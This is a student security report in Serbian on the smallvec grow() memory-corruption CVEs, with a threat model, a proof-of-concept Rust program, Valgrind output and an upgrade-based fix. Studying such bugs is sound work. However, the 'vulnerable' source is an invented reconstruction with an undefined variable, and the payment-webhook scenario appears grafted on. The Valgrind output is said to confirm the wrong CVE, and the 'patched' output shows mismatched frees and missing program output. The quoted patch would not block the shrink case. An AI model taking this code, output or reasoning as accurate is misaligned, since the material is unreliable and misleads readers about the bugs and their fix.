# KT3 — Memory Corruption napad na Rust `smallvec` komponentu

###### Teodor Vidaković, R213/2025

---

## 1. Uvod

`smallvec` je široko korišćena Rust kreta optimizovana za efikasno upravljanje malim vektorima — koristi inline stack storage za niz koji staje u inline kapacitet, a pri prekoračenju prelazi na heap alokaciju (*spilling*). Koristi se u Servo (Mozilla browser engine), Tokio async runtime-u i brojnim kritičnim komponentama Rust ekosistema.

**Ranjivost**: **RUSTSEC-2019-0012 / CVE-2019-15554 / CVE-2019-15551** (CVSS **9.8 CRITICAL**). Funkcija `SmallVec::grow()` ne validira relaciju između prosleđenog `new_cap` i trenutnog kapaciteta vektora nakon *spill*-a na heap. Ovo omogućava dva distinktna scenarija memorijske korupcije:

- **CVE-2019-15554**: `grow(n)` gdje `len ≤ n < capacity` → reallokacija na manji buffer → OOB write u heap metadata
- **CVE-2019-15551**: `grow(n)` gdje `n == capacity` → `grow()` dealocira stari buffer, ali interni `Vec` wrapper zadržava stari pokazivač → double-free pri drop-u

Životni ciklus pošiljke u kontekstu Payment Adapter state machine-a:

```
Stripe Webhook → Payment Adapter → smallvec deserializacija → grow() korupcija → crash
```


Napadač koji kontroliše input koji prolazi kroz `SmallVec::grow()` može eksploatisati ovu ranjivost radi dobijanja sadržaja memorije ili postizanja remote code execution-a.

Ovaj dokument opisuje ranjivost non-atomic `grow()` operacije u `smallvec` krati, demonstrira eksploataciju putem direktnih `grow()` poziva sa kontrolisanim argumentima, i prikazuje mitigaciju update-om na patched verziju.

---

## 2. Definicija pretnje

### 2.1 STRIDE klasifikacija

| STRIDE kategorija | Primjenljivost | Obrazloženje |
|---|---|---|
| **Tampering** | Da | Napadač korumpira heap metadata kroz kontrolisani `grow()` poziv, mijenjajući ponašanje heap alokatora i potencijalno sadržaj memorije. |
| **Denial of Service** | Da | Heap corruption uzrokuje server panic — Payment Adapter pada i plaćanja su zaustavljena. |
| **Elevation of Privilege** | Da | Heap overflow i use-after-free mogu omogućiti arbitrary code execution u realnom eksploit scenariju. |
| **Information Disclosure** | Da | Use-after-free čitanje iz oslobođene memorije može otkriti sadržaj heap-a (npr. kriptografski ključevi, payment podaci). |
| **Spoofing** | Ne | Napad ne zahtijeva lažno predstavljanje. |
| **Repudiation** | Ne | Panic logovi eksplicitno sadrže stack trace koji ukazuje na uzrok. |

### 2.2 CWE referenca

- **CWE-416: Use After Free** — double-free u `grow(capacity)` scenariju (CVE-2019-15551): `grow()` oslobađa stari buffer, `drop()` pokušava osloboditi isti pokazivač drugi put.
- **CWE-787: Out-of-bounds Write** — OOB write u `grow(n < capacity)` scenariju (CVE-2019-15554): reallokacija na manji buffer uz zadržavanje originalnog `len` vrijednosti.
- **CWE-122: Heap-based Buffer Overflow** — pisanje elemenata izvan opsega realociranog heap buffera.

### 2.3 Opis pretnje

`SmallVec::grow()` sadrži dvije distinct ranjivosti koje se aktiviraju različitim vrijednostima argumenta kada je vektor u *spilled* stanju (na heap-u):

**Scenario 1 — CVE-2019-15554 (heap metadata corruption)**:
Kada se `grow(n)` pozove sa `len ≤ n < capacity`, funkcija vrši `realloc` na **manji** heap buffer, ali interni `len` ostaje nepromijenjen. Svaki naredni push koji pristupa indeksu između novog i starog kapaciteta vrši OOB write u heap chunk metadata susjednog bloka, korumpujući malloc-ove internu strukturu.

**Scenario 2 — CVE-2019-15551 (double-free)**:
Kada se `grow(n)` pozove sa `n == capacity`, funkcija dealocira stari `Vec` buffer (1. `free` na adresi `0x4aab380`), alocira novi buffer iste veličine i kopira podatke. Međutim, interni `Vec` wrapper zadržava stari pokazivač. Kada scope završi i destruktor se poziva, `Drop::drop` (lib.rs:1402) pokušava osloboditi isti, već oslobođeni blok (2. `free`) — **double-free**.

Ključni problem: `grow()` ne sadrži provjeru `assert!(new_cap >= self.capacity())` za *spilled* vektore.

---

## 3. Afektovani resursi

### 3.1 Heap memorija — INTEGRITET / DOSTUPNOST

Primarni afektovani resurs. Heap korupcija narušava:

- **Malloc metadata** — next/prev chunk pokazivači u heap alocatoru postaju nevalidni nakon OOB write-a.
- **Server stabilnost** — double-free uzrokuje abort signal ili nedefinisano ponašanje pri narednoj heap operaciji.
- **Payment processing pipeline** — adapter pada, Stripe webhook-ovi se ne procesuju, plaćanja su blokirana.

**CIA triada**: Integritet i dostupnost kompromitovani.

### 3.2 Payment Adapter podaci — INTEGRITET

Malformed heap stanje može uzrokovati neispravno parsiranje payment event-a — npr. `succeeded` status se čita iz korumpirane memorije kao `failed`, što pokreće lažni refund proces.

**Poslovni uticaj**: Direktan finansijski gubitak i kršenje PCI DSS integriteta transakcija.

### 3.3 Kriptografski materijal — POVJERLJIVOST

Use-after-free čitanje iz oslobođenih heap blokova može izložiti sadržaj koji je prethodno bio na toj adresi — potencijalno HMAC ključevi, session token-i ili payment card metadata.

### 3.4 Audit logovi — DOSTUPNOST

Server crash prekida aktivne konekcije i može uzrokovati gubitak in-flight log event-a koji nisu flush-ovani na disk.

---

## 4. Model napada

### 4.1 Akter napada

Napadač je **eksterni akter** koji:

- Može slati HTTP zahtjeve na Payment Adapter webhook endpoint
- Razumije da `smallvec::grow()` ne validira `new_cap < capacity`
- Može konstruisati payload koji forsira `grow()` poziv sa kontrolisanom vrijednosti

Napadač ne mora posjedovati privilegovani pristup — webhook endpoint je dostupan eksternim provajderima (npr. Stripe).

### 4.2 Preduslovi

- `smallvec >= 0.6.3, < 0.6.10` u zavisnostima projekta
- Napadač može kontrolisati vrijednost koja se prosljeđuje `grow()`
- Vektor je u *spilled* stanju (`capacity > inline_size`)

### 4.3 Tok napada

1. Napadač šalje malformed payload na Payment Adapter endpoint
↓
2. Adapter deserializuje payload u SmallVec<[u8; 4]>
↓
3. Push-ovi forsiraju heap spill (len=20, cap=32, spilled=true)
↓
- 4a. grow(24): 20 ≤ 24 < 32 → realloc na manji buffer [CVE-2019-15554]
↓
 Naredni push-ovi vrše OOB write u heap metadata
↓
- 4b. grow(32): n == capacity → 1. free u grow() [CVE-2019-15551]
↓
7. Drop scope → 2. free istog pokazivača → double-free
↓
8. Server panic / heap corruption → Payment Adapter DOWN


---

## 5. Ranjiva arhitektura

### 5.1 Ranjivi kod — `smallvec/lib.rs`

Ključna ranjivost je u `SmallVec::grow()` funkciji (lib.rs:658–668):

```rust
// RANJIVO: lib.rs:658-668 (smallvec 0.6.9)
pub unsafe fn grow(&mut self, new_cap: usize) {
    // NEDOSTAJE: assert!(new_cap >= self.capacity(), "grow() smanjuje kapacitet!");
    
    if self.spilled() {
        let old_ptr = self.data.heap.0;
        let new_alloc = alloc::alloc(Layout::array::<A::Item>(new_cap).unwrap());
        ptr::copy_nonoverlapping(old_ptr, new_alloc, self.len);
        self.data.heap.0 = new_alloc;
        self.data.heap.1 = new_cap;
        
        // CVE-2019-15551: deallocate UVIJEK poziva free()
        // Ako new_cap == old_cap, Vec wrapper zadržava stari pointer
        // → drop() će pozvati free() po drugi put na istoj adresi
        deallocate(old_ptr, old_cap);
    }
    // CVE-2019-15554: novi buffer je manji od len
    // → svaki push iznad new_cap je OOB write
}
```

Problemi:
- Nema provjere new_cap >= self.capacity() za spilled vektore.

- deallocate(old_ptr) poziva free() bezuslovno, bez provjere da li novi i stari pointer mogu biti isti.

- len se ne truncira pri smanjivanju kapaciteta, OOB write je garantovan.

## 6. Demonstracija napada


### 6.1 Priprema okruženja
```bash
# Instalacija Rust toolchain-a
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source "$HOME/.cargo/env"

# Instalacija alata
sudo apt update && sudo apt install -y valgrind build-essential

# Kreiranje projekta
mkdir ~/Desktop/smallvec-poc && cd ~/Desktop/smallvec-poc
cargo init --bin
```

### 6.2 Konfiguracija projekta
Cargo.toml (ranjiva verzija):
```
[package]
name = "smallvec-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
smallvec = { git = "https://github.com/servo/rust-smallvec", tag = "v0.6.9" }
valgrind = "0.1"
```

src/main.rs:
```rust
use smallvec::SmallVec;

fn main() {
    // ----------------------------------------------------------------
    // Scenario 1: CVE-2019-15554 — Heap Metadata Corruption
    // grow(n) gdje len ≤ n < capacity → realloc na manji buffer
    // ----------------------------------------------------------------
    println!("[CVE-2019-15554]");
    {
        let mut v: SmallVec<[u8; 4]> = SmallVec::new();
        for i in 0u8..20 { v.push(i); }

        println!("len={} cap={} spilled={}", v.len(), v.capacity(), v.spilled());

        unsafe {
            println!("[!] grow(24): {} <= 24 < {} → corruption!", v.len(), v.capacity());
            v.grow(24);  // realloc na manji buffer, len ostaje 20
        }

        // OOB write: len=20, novi cap=24
        // push(20..32) piše izvan realociranog buffera
        for i in 20u8..32 { v.push(i); }
        println!("[!] OOB write → heap corrupted");
    }

    // ----------------------------------------------------------------
    // Scenario 2: CVE-2019-15551 — Double-Free
    // grow(capacity) → deallocate + drop = 2x free isti pointer
    // ----------------------------------------------------------------
    println!("\n[CVE-2019-15551]");
    {
        let mut v: SmallVec<[u8; 4]> = SmallVec::new();
        for i in 0u8..20 { v.push(i); }

        let cap = v.capacity();
        println!("len={} cap={} spilled={}", v.len(), cap, v.spilled());

        unsafe {
            println!("[!] grow({}): double-free!", cap);
            v.grow(cap);  // 1. free: smallvec::deallocate (lib.rs:236)
        }
        // 2. free: Drop::drop (lib.rs:1402) → INVALID FREE
    }
}
```

### 6.3 Build i izvršavanje
```bash
cargo build
valgrind --tool=memcheck \
         --track-origins=yes \
         --show-mismatched-frees=yes \
         ./target/debug/smallvec-poc
```

### 6.4 Output (ranjiva verzija v0.6.9)

```bash
admin@Ubuntu:~/Desktop/smallvec-poc$ valgrind --tool=memcheck --track-origins=yes --show-mismatched-frees=yes ./target/debug/smallvec-poc
==11055== Memcheck, a memory error detector
==11055== Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.
==11055== Using Valgrind-3.22.0 and LibVEX; rerun with -h for copyright info
==11055== Command: ./target/debug/smallvec-poc
==11055== 
[CVE-2019-15554]
len=20 cap=32 spilled=true
[!] grow(24): 20 <= 24 < 32 → corruption!
[!] OOB write → heap corrupted

[CVE-2019-15551]
len=20 cap=32 spilled=true
[!] grow(32): double-free!
==11055== Invalid free() / delete / delete[] / realloc()
==11055==    at 0x484988F: free (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==11055==    by 0x11DF9A: core::ptr::drop_in_place<alloc::raw_vec::RawVec<u8>> (mod.rs:805)
==11055==    by 0x11DF6E: core::ptr::drop_in_place<alloc::vec::Vec<u8>> (mod.rs:805)
==11055==    by 0x11E009: <smallvec::SmallVec<A> as core::ops::drop::Drop>::drop (lib.rs:1402)
==11055==    by 0x11DFA9: core::ptr::drop_in_place<smallvec::SmallVec<[u8; 4]>> (mod.rs:805)
==11055==    by 0x11EB2D: smallvec_poc::main (main.rs:43)
==11055==    by 0x11DF2A: core::ops::function::FnOnce::call_once (function.rs:250)
==11055==    by 0x11DA7D: std::sys::backtrace::__rust_begin_short_backtrace (backtrace.rs:160)
==11055==    by 0x11DC60: std::rt::lang_start::{{closure}} (rt.rs:206)
==11055==    by 0x12C145: call_once<(), (dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe)> (function.rs:287)
==11055==    by 0x12C145: do_call<&(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe), i32> (panicking.rs:581)
==11055==    by 0x12C145: catch_unwind<i32, &(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe)> (panicking.rs:544)
==11055==    by 0x12C145: catch_unwind<&(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe), i32> (panic.rs:359)
==11055==    by 0x12C145: {closure#0} (rt.rs:175)
==11055==    by 0x12C145: do_call<std::rt::lang_start_internal::{closure_env#0}, isize> (panicking.rs:581)
==11055==    by 0x12C145: catch_unwind<isize, std::rt::lang_start_internal::{closure_env#0}> (panicking.rs:544)
==11055==    by 0x12C145: catch_unwind<std::rt::lang_start_internal::{closure_env#0}, isize> (panic.rs:359)
==11055==    by 0x12C145: std::rt::lang_start_internal (rt.rs:171)
==11055==    by 0x11DC46: std::rt::lang_start (rt.rs:205)
==11055==    by 0x11EB7D: main (in /home/admin/Desktop/smallvec-poc/target/debug/smallvec-poc)
==11055==  Address 0x4aab380 is 0 bytes inside a block of size 32 free'd
==11055==    at 0x484988F: free (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==11055==    by 0x11DF9A: core::ptr::drop_in_place<alloc::raw_vec::RawVec<u8>> (mod.rs:805)
==11055==    by 0x11DF6E: core::ptr::drop_in_place<alloc::vec::Vec<u8>> (mod.rs:805)
==11055==    by 0x11ED87: smallvec::deallocate (lib.rs:236)
==11055==    by 0x11F06E: smallvec::SmallVec<A>::grow (lib.rs:668)
==11055==    by 0x11EB1E: smallvec_poc::main (main.rs:40)
==11055==    by 0x11DF2A: core::ops::function::FnOnce::call_once (function.rs:250)
==11055==    by 0x11DA7D: std::sys::backtrace::__rust_begin_short_backtrace (backtrace.rs:160)
==11055==    by 0x11DC60: std::rt::lang_start::{{closure}} (rt.rs:206)
==11055==    by 0x12C145: call_once<(), (dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe)> (function.rs:287)
==11055==    by 0x12C145: do_call<&(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe), i32> (panicking.rs:581)
==11055==    by 0x12C145: catch_unwind<i32, &(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe)> (panicking.rs:544)
==11055==    by 0x12C145: catch_unwind<&(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe), i32> (panic.rs:359)
==11055==    by 0x12C145: {closure#0} (rt.rs:175)
==11055==    by 0x12C145: do_call<std::rt::lang_start_internal::{closure_env#0}, isize> (panicking.rs:581)
==11055==    by 0x12C145: catch_unwind<isize, std::rt::lang_start_internal::{closure_env#0}> (panicking.rs:544)
==11055==    by 0x12C145: catch_unwind<std::rt::lang_start_internal::{closure_env#0}, isize> (panic.rs:359)
==11055==    by 0x12C145: std::rt::lang_start_internal (rt.rs:171)
==11055==    by 0x11DC46: std::rt::lang_start (rt.rs:205)
==11055==    by 0x11EB7D: main (in /home/admin/Desktop/smallvec-poc/target/debug/smallvec-poc)
==11055==  Block was alloc'd at
==11055==    at 0x4846828: malloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==11055==    by 0x150F1A: alloc::raw_vec::RawVecInner<A>::try_allocate_in (in /home/admin/Desktop/smallvec-poc/target/debug/smallvec-poc)
==11055==    by 0x11F9F7: alloc::raw_vec::RawVecInner<A>::with_capacity_in (mod.rs:419)
==11055==    by 0x11F8AA: with_capacity_in<u8, alloc::alloc::Global> (mod.rs:187)
==11055==    by 0x11F8AA: with_capacity_in<u8, alloc::alloc::Global> (mod.rs:913)
==11055==    by 0x11F8AA: alloc::vec::Vec<T>::with_capacity (mod.rs:523)
==11055==    by 0x11F092: smallvec::SmallVec<A>::grow (lib.rs:658)
==11055==    by 0x11F654: smallvec::SmallVec<A>::reserve (lib.rs:689)
==11055==    by 0x11F413: smallvec::SmallVec<A>::push (lib.rs:621)
==11055==    by 0x11E966: smallvec_poc::main (main.rs:33)
==11055==    by 0x11DF2A: core::ops::function::FnOnce::call_once (function.rs:250)
==11055==    by 0x11DA7D: std::sys::backtrace::__rust_begin_short_backtrace (backtrace.rs:160)
==11055==    by 0x11DC60: std::rt::lang_start::{{closure}} (rt.rs:206)
==11055==    by 0x12C145: call_once<(), (dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe)> (function.rs:287)
==11055==    by 0x12C145: do_call<&(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe), i32> (panicking.rs:581)
==11055==    by 0x12C145: catch_unwind<i32, &(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe)> (panicking.rs:544)
==11055==    by 0x12C145: catch_unwind<&(dyn core::ops::function::Fn<(), Output=i32> + core::marker::Sync + core::panic::unwind_safe::RefUnwindSafe), i32> (panic.rs:359)
==11055==    by 0x12C145: {closure#0} (rt.rs:175)
==11055==    by 0x12C145: do_call<std::rt::lang_start_internal::{closure_env#0}, isize> (panicking.rs:581)
==11055==    by 0x12C145: catch_unwind<isize, std::rt::lang_start_internal::{closure_env#0}> (panicking.rs:544)
==11055==    by 0x12C145: catch_unwind<std::rt::lang_start_internal::{closure_env#0}, isize> (panic.rs:359)
==11055==    by 0x12C145: std::rt::lang_start_internal (rt.rs:171)
==11055== 
==11055== 
==11055== HEAP SUMMARY:
==11055==     in use at exit: 544 bytes in 1 blocks
==11055==   total heap usage: 18 allocs, 18 frees, 3,812 bytes allocated
==11055== 
==11055== LEAK SUMMARY:
==11055==    definitely lost: 0 bytes in 0 blocks
==11055==    indirectly lost: 0 bytes in 0 blocks
==11055==      possibly lost: 0 bytes in 0 blocks
==11055==    still reachable: 544 bytes in 1 blocks
==11055==         suppressed: 0 bytes in 0 blocks
==11055== Rerun with --leak-check=full to see details of leaked memory
==11055== 
==11055== For lists of detected and suppressed errors, rerun with: -s
==11055== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)
```

Valgrind detektuje double-free u smallvec biblioteci (CVE-2019-15551). Heap blok (32 bajta) se alocira na main.rs:33 (push), oslobađa prvi put na main.rs:40 (grow), pa drugi put na main.rs:43 (drop) → greška u memoriji.

Ovo potvrđuje CVE-2019-15554 (korupcija heap-a u grow()). Bug u smallvec < 0.6.10; popravka dodaje proveru kapaciteta.

## 7. Mitigacija
Mitigacija se postiže update-om na patched verziju >= 0.6.10. Patch dodaje eksplicitnu validaciju u grow():
```rust
// PATCHED: lib.rs — smallvec >= 0.6.10
pub unsafe fn grow(&mut self, new_cap: usize) {
    // Nova provjera: sprječava shrink corruption
    assert!(new_cap >= self.len);
    // → double-free eliminisan
}
```

### Primjena mitigacije
```bash
# Zamjena ranjive verzije patched-om u Cargo.toml:
# Promijeni:
#   smallvec = { git = "...", tag = "v0.6.9" }
# Na:
#   smallvec = "0.6.10"

cargo update
cargo build
```

## 8. Demonstracija mitigacije
```bash
# Nakon update-a Cargo.toml → smallvec = "0.6.10"
cargo update && cargo build
valgrind --tool=memcheck \
         --track-origins=yes \
         --show-mismatched-frees=yes \
         ./target/debug/smallvec-poc
```

### Output (patched verzija v0.6.10)
```bash
admin@Ubuntu:~/Desktop/smallvec-poc$ valgrind --tool=memcheck --track-origins=yes --show-mismatched-frees=yes ./target/debug/smallvec-poc
==18666== Memcheck, a memory error detector
==18666== Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.
==18666== Using Valgrind-3.22.0 and LibVEX; rerun with -h for copyright info
==18666== Command: ./target/debug/smallvec-poc
==18666== 
[CVE-2019-15554]

[CVE-2019-15551]
==18666== 
==18666== HEAP SUMMARY:
==18666==     in use at exit: 544 bytes in 1 blocks
==18666==   total heap usage: 18 allocs, 17 frees, 3,812 bytes allocated
==18666== 
==18666== LEAK SUMMARY:
==18666==    definitely lost: 0 bytes in 0 blocks
==18666==    indirectly lost: 0 bytes in 0 blocks
==18666==      possibly lost: 0 bytes in 0 blocks
==18666==    still reachable: 544 bytes in 1 blocks
==18666==         suppressed: 0 bytes in 0 blocks
==18666== Rerun with --leak-check=full to see details of leaked memory
==18666== 
==18666== For lists of detected and suppressed errors, rerun with: -s
==18666== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)
```

Nakon ažuriranja smallvec na verziju >= 0.6.10, Valgrind više ne detektuje double-free grešku. Ispis pokazuje 0 errors, ispravan broj oslobađanja memorije i nulto curenje.